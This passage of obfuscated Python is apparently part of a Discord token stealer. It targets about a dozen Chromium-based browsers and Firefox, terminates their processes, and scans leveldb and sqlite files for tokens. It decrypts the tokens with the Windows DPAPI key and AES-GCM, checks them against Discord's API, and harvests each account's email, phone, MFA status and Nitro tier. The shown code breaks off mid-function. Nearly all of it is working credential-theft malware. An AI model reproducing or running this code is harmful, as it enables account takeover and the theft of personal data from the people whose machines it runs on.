            ("Google Chrome Canary",   os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
            ("Epic Privacy Browser",   os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
            ("Microsoft Edge",         os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
            ("Uran",                   os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
            ("Yandex",                 os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex Tech",            os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
            ("Brave",                  os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
            ("Iridium",                os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
        ]

        
        try:
             for GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r_proc_name in SDDVXOCEFSWMPSRHHPKPPFKRIHNYXJCELDXMDCKGUZYYLQVLSFBMMCPLQVSIZPCZRBGYGYPUZSJPIJJQ:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.name().lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except: pass
        except: pass

        for GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r_proc_name in SDDVXOCEFSWMPSRHHPKPPFKRIHNYXJCELDXMDCKGUZYYLQVLSFBMMCPLQVSIZPCZRBGYGYPUZSJPIJJQ:
            if not os.path.exists(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):

                continue
            IGQSBEKIYVEFLGGVIHCBUCZOARPSXTDUASQUFQNNIXBVTCOHCKBEWUZNJZVEMSWVSPCZYTXXFUHXVOTYLMFG = GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ.replace(" ", "").lower()
            if "cord" in YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO:
                if not os.path.exists(os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, IGQSBEKIYVEFLGGVIHCBUCZOARPSXTDUASQUFQNNIXBVTCOHCKBEWUZNJZVEMSWVSPCZYTXXFUHXVOTYLMFG, 'Local State')):
                    continue
                for v4r_file_name in os.listdir(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    XONSBHDCNEWWURQDJGOCENRIYWBTAUBCKAQVERWKBWXWUNFSOKPPWEQKOEPQRKZMHZCGEXPTLHQLASDCLKDYGZVKXVSMBJI = os.path.join(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r_file_name)
                    if os.path.exists(XONSBHDCNEWWURQDJGOCENRIYWBTAUBCKAQVERWKBWXWUNFSOKPPWEQKOEPQRKZMHZCGEXPTLHQLASDCLKDYGZVKXVSMBJI):
                        with open(XONSBHDCNEWWURQDJGOCENRIYWBTAUBCKAQVERWKBWXWUNFSOKPPWEQKOEPQRKZMHZCGEXPTLHQLASDCLKDYGZVKXVSMBJI, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for y in re.findall(ZCOMINUWUAGLJTWQDEYEPMQSVDSOKHLRANCVCWWKQQFAVKKJNMVWBZMOITRVOWBHLTAUGUBUZUNUBUZOUMMRAXBORISRRF_enc, v4r_line.strip()):
                                    LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO = OGPEXAMMLQCTCCGKKRBMDMPUBJWXMJBVVZVRUWRAWRGQGJDKPSCORUDUAPTQHASCPOMCLZXCPCSHVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), LKLONIPBLTJZDBIKGOPTZXGFJWNZBGEYKLERPZCTBHSRFUYATVGQYVFPJSFQAYMXPUZFGHISTLZNADOWRBWUBIULJPX(os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, IGQSBEKIYVEFLGGVIHCBUCZOARPSXTDUASQUFQNNIXBVTCOHCKBEWUZNJZVEMSWVSPCZYTXXFUHXVOTYLMFG, 'Local State')))
                                    if ESBODCKUZIXSVFIQNWOGKFLGGUPFKRQBSZHLLSYVGEJKEPNTXIDJPVIXKCHHJAOGAMELLYIHFGAXCPJTHSKSTLGGLTIHHVQRQLH(LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO, RAUYUBHRJIBHPAMHLBMOFAXESKEMNEKCCNFXXDSHOKKHIGZMMCJFVIQSPSZHCOAPPWJAWJGACORLVTFCOVA):
                                        ZUGEFDNIQNJKUZPJEACBYWUHQAWSCXFEKKAFXSDMDPWRJMTAWKPKKMMACYWIHJILTXTFBJBKDKUVHZEHPKNCFR = requests.get(RAUYUBHRJIBHPAMHLBMOFAXESKEMNEKCCNFXXDSHOKKHIGZMMCJFVIQSPSZHCOAPPWJAWJGACORLVTFCOVA, headers={'Authorization': LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO}).json()['id']
                                        if ZUGEFDNIQNJKUZPJEACBYWUHQAWSCXFEKKAFXSDMDPWRJMTAWKPKKMMACYWIHJILTXTFBJBKDKUVHZEHPKNCFR not in FTAUPFDBMDVRGZISBXQNDQMXCLDSJOGBBDBQJAKRSHKRDIVQWTIEQWMADOUJWPA:
                                            EYPUYWQPOYNPBWWEOAXAKPJULNHJDASGPYYYDMEWUMZAPXLDVOUHKXJZUIBKHOJDUWLSOETFS.append(LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO)
                                            FTAUPFDBMDVRGZISBXQNDQMXCLDSJOGBBDBQJAKRSHKRDIVQWTIEQWMADOUJWPA.append(ZUGEFDNIQNJKUZPJEACBYWUHQAWSCXFEKKAFXSDMDPWRJMTAWKPKKMMACYWIHJILTXTFBJBKDKUVHZEHPKNCFR)
                                            SNGCZZSMXIWXSIUAXBYLXPTZABAPZDBUGTLEUBTIYNOGETYGOTDAEEXWCDPLCDOYPGVTHHLSPWOUVJCOCUOLITF[LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO] = (GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, XONSBHDCNEWWURQDJGOCENRIYWBTAUBCKAQVERWKBWXWUNFSOKPPWEQKOEPQRKZMHZCGEXPTLHQLASDCLKDYGZVKXVSMBJI)
            else:
                for v4r_file_name in os.listdir(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    XONSBHDCNEWWURQDJGOCENRIYWBTAUBCKAQVERWKBWXWUNFSOKPPWEQKOEPQRKZMHZCGEXPTLHQLASDCLKDYGZVKXVSMBJI = os.path.join(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r_file_name)
                    if os.path.exists(XONSBHDCNEWWURQDJGOCENRIYWBTAUBCKAQVERWKBWXWUNFSOKPPWEQKOEPQRKZMHZCGEXPTLHQLASDCLKDYGZVKXVSMBJI):
                        with open(XONSBHDCNEWWURQDJGOCENRIYWBTAUBCKAQVERWKBWXWUNFSOKPPWEQKOEPQRKZMHZCGEXPTLHQLASDCLKDYGZVKXVSMBJI, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO in re.findall(ZCOMINUWUAGLJTWQDEYEPMQSVDSOKHLRANCVCWWKQQFAVKKJNMVWBZMOITRVOWBHLTAUGUBUZUNUBUZOUMMRAXBORISRRF, v4r_line.strip()):
                                    if ESBODCKUZIXSVFIQNWOGKFLGGUPFKRQBSZHLLSYVGEJKEPNTXIDJPVIXKCHHJAOGAMELLYIHFGAXCPJTHSKSTLGGLTIHHVQRQLH(LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO, RAUYUBHRJIBHPAMHLBMOFAXESKEMNEKCCNFXXDSHOKKHIGZMMCJFVIQSPSZHCOAPPWJAWJGACORLVTFCOVA):
                                        ZUGEFDNIQNJKUZPJEACBYWUHQAWSCXFEKKAFXSDMDPWRJMTAWKPKKMMACYWIHJILTXTFBJBKDKUVHZEHPKNCFR = requests.get(RAUYUBHRJIBHPAMHLBMOFAXESKEMNEKCCNFXXDSHOKKHIGZMMCJFVIQSPSZHCOAPPWJAWJGACORLVTFCOVA, headers={'Authorization': LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO}).json()['id']
                                        if ZUGEFDNIQNJKUZPJEACBYWUHQAWSCXFEKKAFXSDMDPWRJMTAWKPKKMMACYWIHJILTXTFBJBKDKUVHZEHPKNCFR not in FTAUPFDBMDVRGZISBXQNDQMXCLDSJOGBBDBQJAKRSHKRDIVQWTIEQWMADOUJWPA:
                                            EYPUYWQPOYNPBWWEOAXAKPJULNHJDASGPYYYDMEWUMZAPXLDVOUHKXJZUIBKHOJDUWLSOETFS.append(LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO)
                                            FTAUPFDBMDVRGZISBXQNDQMXCLDSJOGBBDBQJAKRSHKRDIVQWTIEQWMADOUJWPA.append(ZUGEFDNIQNJKUZPJEACBYWUHQAWSCXFEKKAFXSDMDPWRJMTAWKPKKMMACYWIHJILTXTFBJBKDKUVHZEHPKNCFR)
                                            SNGCZZSMXIWXSIUAXBYLXPTZABAPZDBUGTLEUBTIYNOGETYGOTDAEEXWCDPLCDOYPGVTHHLSPWOUVJCOCUOLITF[LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO] = (GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, XONSBHDCNEWWURQDJGOCENRIYWBTAUBCKAQVERWKBWXWUNFSOKPPWEQKOEPQRKZMHZCGEXPTLHQLASDCLKDYGZVKXVSMBJI)

        if os.path.exists(os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Mozilla", "Firefox", "Profiles")):
            for YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, _, v4r_files in os.walk(os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Mozilla", "Firefox", "Profiles")):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(os.path.join(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r__file), errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO in re.findall(ZCOMINUWUAGLJTWQDEYEPMQSVDSOKHLRANCVCWWKQQFAVKKJNMVWBZMOITRVOWBHLTAUGUBUZUNUBUZOUMMRAXBORISRRF, v4r_line.strip()):
                                    if ESBODCKUZIXSVFIQNWOGKFLGGUPFKRQBSZHLLSYVGEJKEPNTXIDJPVIXKCHHJAOGAMELLYIHFGAXCPJTHSKSTLGGLTIHHVQRQLH(LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO, RAUYUBHRJIBHPAMHLBMOFAXESKEMNEKCCNFXXDSHOKKHIGZMMCJFVIQSPSZHCOAPPWJAWJGACORLVTFCOVA):
                                        ZUGEFDNIQNJKUZPJEACBYWUHQAWSCXFEKKAFXSDMDPWRJMTAWKPKKMMACYWIHJILTXTFBJBKDKUVHZEHPKNCFR = requests.get(RAUYUBHRJIBHPAMHLBMOFAXESKEMNEKCCNFXXDSHOKKHIGZMMCJFVIQSPSZHCOAPPWJAWJGACORLVTFCOVA, headers={'Authorization': LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO}).json()['id']
                                        if ZUGEFDNIQNJKUZPJEACBYWUHQAWSCXFEKKAFXSDMDPWRJMTAWKPKKMMACYWIHJILTXTFBJBKDKUVHZEHPKNCFR not in FTAUPFDBMDVRGZISBXQNDQMXCLDSJOGBBDBQJAKRSHKRDIVQWTIEQWMADOUJWPA:
                                            EYPUYWQPOYNPBWWEOAXAKPJULNHJDASGPYYYDMEWUMZAPXLDVOUHKXJZUIBKHOJDUWLSOETFS.append(LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO)
                                            FTAUPFDBMDVRGZISBXQNDQMXCLDSJOGBBDBQJAKRSHKRDIVQWTIEQWMADOUJWPA.append(ZUGEFDNIQNJKUZPJEACBYWUHQAWSCXFEKKAFXSDMDPWRJMTAWKPKKMMACYWIHJILTXTFBJBKDKUVHZEHPKNCFR)
                                            SNGCZZSMXIWXSIUAXBYLXPTZABAPZDBUGTLEUBTIYNOGETYGOTDAEEXWCDPLCDOYPGVTHHLSPWOUVJCOCUOLITF[LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO] = ('Firefox', os.path.join(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r__file))
        return EYPUYWQPOYNPBWWEOAXAKPJULNHJDASGPYYYDMEWUMZAPXLDVOUHKXJZUIBKHOJDUWLSOETFS, SNGCZZSMXIWXSIUAXBYLXPTZABAPZDBUGTLEUBTIYNOGETYGOTDAEEXWCDPLCDOYPGVTHHLSPWOUVJCOCUOLITF

    def ESBODCKUZIXSVFIQNWOGKFLGGUPFKRQBSZHLLSYVGEJKEPNTXIDJPVIXKCHHJAOGAMELLYIHFGAXCPJTHSKSTLGGLTIHHVQRQLH(LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO, RAUYUBHRJIBHPAMHLBMOFAXESKEMNEKCCNFXXDSHOKKHIGZMMCJFVIQSPSZHCOAPPWJAWJGACORLVTFCOVA):
        return requests.get(RAUYUBHRJIBHPAMHLBMOFAXESKEMNEKCCNFXXDSHOKKHIGZMMCJFVIQSPSZHCOAPPWJAWJGACORLVTFCOVA, headers={'Authorization': LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO}).status_code == 200

    def OGPEXAMMLQCTCCGKKRBMDMPUBJWXMJBVVZVRUWRAWRGQGJDKPSCORUDUAPTQHASCPOMCLZXCPCSHVal(MZZCONAQTUBFNOOLFCTETIGJRINQSNFHGIGUTKPOHNVVPUWPVVNZCNBRBJDGMWORZOTWCQWEHBRSFMXQLODTKBITRS, XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY):
        QLKTXILHSLSJTCQDFBWTAKRRYNBASLIJLMPOKDDAGGMVNTNLDOVTGGOCZIAJAQRPJIQDDYUALHEUT = MZZCONAQTUBFNOOLFCTETIGJRINQSNFHGIGUTKPOHNVVPUWPVVNZCNBRBJDGMWORZOTWCQWEHBRSFMXQLODTKBITRS[3:15]
        EYOMEAEDDNIRPRRRGCDCEOVXVJSOSUMXBLTLRGOYXVANCILLNCZXZNSCVBKLCTYODKWXZBTOWWPPBYBCT = MZZCONAQTUBFNOOLFCTETIGJRINQSNFHGIGUTKPOHNVVPUWPVVNZCNBRBJDGMWORZOTWCQWEHBRSFMXQLODTKBITRS[15:]
        GHSCSCPVNYFSGOANGCAOVLQMMTNJQCGLHLJVDNRRBOPNNIOYTVSXNFOHOVVUYLVUQMOFVMKH = AES.new(XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY, AES.MODE_GCM, QLKTXILHSLSJTCQDFBWTAKRRYNBASLIJLMPOKDDAGGMVNTNLDOVTGGOCZIAJAQRPJIQDDYUALHEUT)
        return GHSCSCPVNYFSGOANGCAOVLQMMTNJQCGLHLJVDNRRBOPNNIOYTVSXNFOHOVVUYLVUQMOFVMKH.decrypt(EYOMEAEDDNIRPRRRGCDCEOVXVJSOSUMXBLTLRGOYXVANCILLNCZXZNSCVBKLCTYODKWXZBTOWWPPBYBCT)[:-16].decode()

    def LKLONIPBLTJZDBIKGOPTZXGFJWNZBGEYKLERPZCTBHSRFUYATVGQYVFPJSFQAYMXPUZFGHISTLZNADOWRBWUBIULJPX(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):
        if not os.path.exists(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):
            return None
        with open(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, "r", encoding="utf-8") as v4r_f:
            GPCLIGCTELGGEMAMPPPMLIDVNDUIVSJESNRTMPTXHISKXFDBZJGUBLRMWYOHCBWD = json.load(v4r_f)
        XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY = base64.b64decode(GPCLIGCTELGGEMAMPPPMLIDVNDUIVSJESNRTMPTXHISKXFDBZJGUBLRMWYOHCBWD["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY, None, None, None, 0)[1]

    EYPUYWQPOYNPBWWEOAXAKPJULNHJDASGPYYYDMEWUMZAPXLDVOUHKXJZUIBKHOJDUWLSOETFS, SNGCZZSMXIWXSIUAXBYLXPTZABAPZDBUGTLEUBTIYNOGETYGOTDAEEXWCDPLCDOYPGVTHHLSPWOUVJCOCUOLITF = KQAWBNQSJZYFLMVUQFEXJTKGFKFEQIIFFCZYIIFBPJYHFJOAKBTCDMOBGMBXSPKNVQAFYVXYKAYHWMPJNPUDKVORSHVNVGDHAYJ()
    
    if not EYPUYWQPOYNPBWWEOAXAKPJULNHJDASGPYYYDMEWUMZAPXLDVOUHKXJZUIBKHOJDUWLSOETFS:
        HSWJCCJQASWMWJJBZWZGDIGUKFGRZNVJWOGJDDZXCCZIOTMOWLJRLPSWMSJBTSWYR = "No discord tokens found."

    for LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO_d15c0rd in EYPUYWQPOYNPBWWEOAXAKPJULNHJDASGPYYYDMEWUMZAPXLDVOUHKXJZUIBKHOJDUWLSOETFS:
        MVORSKFSYNELBCHBUUYXVSDOHYZQWXZSJPJGKWJDALFVXLLSIQLUDGLOPLLYJVIUWBDFZLJTOJKLLQZSTAJZTRZQHIQV += 1

        try: GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO_d15c0rd}).json()
        except: GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD = {"None": "None"}

        DEMMOKXVDNILNFGIFQEZYQHZGKDKIUDHJCFWPYXSIRFIZJYDMABEMLMZVYHTPJURHXMJIZCMXDEIXQQNQOCVHNPGKFVEYZBQQ = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('username', "None") + '#' + GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('discriminator', "None")
        BSAZXONCPUCGAWKSTUQSOJTFFBMAXQDMREKDZCPTCMYYSYFMHXITOIJDDFHXMU = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('global_name', "None")
        KOQZQFGKJKNXMWVZOBENFGZCXPXAQIGCTOUNHTHRPAXAPVLFFNMCULLNAUNWBIEXQFUCSZYMEHIUDBWLU = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('id', "None")
        MMGBHMMXNAEDXRJWKKFSGTWDSUMDHQSDKJIUUHCZBSAEVMWMHSLUWJZURIWS = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('email', "None")
        FEQRBSTQKMVDUJMEPWVEUYVITGQMRTDHOLOQMJEDKZASDCLDTFLMGVJNJGVUMXJHEVYDOJKQPCRBAXFB = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('verified', "None")
        WSKUAFXPAHIGBHINJXYROFZGPAOVAXSLZJWNAJZHJTRZIMEBBOBZNHQJJRZXPAJOG = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('phone', "None")
        EHOQNSDQARDOOQFCTRMRLRGVNMTUCWLAOENXSUYWYXDRTBIURBSUXOZYTNSASOJUPEHORKDUXNUDMNUCWMFZJJUMXPY = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('locale', "None")
        HITLUHPRZDCABLEWJPILKZJEUAWFCJRFONHZPZZRYMXAGBOYHYHXWCSSNEAVFLAIGLHDHDJRTHJICUN = GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('mfa_enabled', "None")

        try:
            if GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('premium_type', 'None') == 0:
                BFXJDCJWCHNKISVJBPBEZQAAZPRVWFCBZIYTLPZXHOSCVTRSTKZUKPSASMNLGHEQYVXYLUGL = 'False'
            elif GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('premium_type', 'None') == 1:
                BFXJDCJWCHNKISVJBPBEZQAAZPRVWFCBZIYTLPZXHOSCVTRSTKZUKPSASMNLGHEQYVXYLUGL = 'Nitro Classic'
            elif GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('premium_type', 'None') == 2:
                BFXJDCJWCHNKISVJBPBEZQAAZPRVWFCBZIYTLPZXHOSCVTRSTKZUKPSASMNLGHEQYVXYLUGL = 'Nitro Boosts'
            elif GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD.get('premium_type', 'None') == 3:
                BFXJDCJWCHNKISVJBPBEZQAAZPRVWFCBZIYTLPZXHOSCVTRSTKZUKPSASMNLGHEQYVXYLUGL = 'Nitro Basic'
            else:
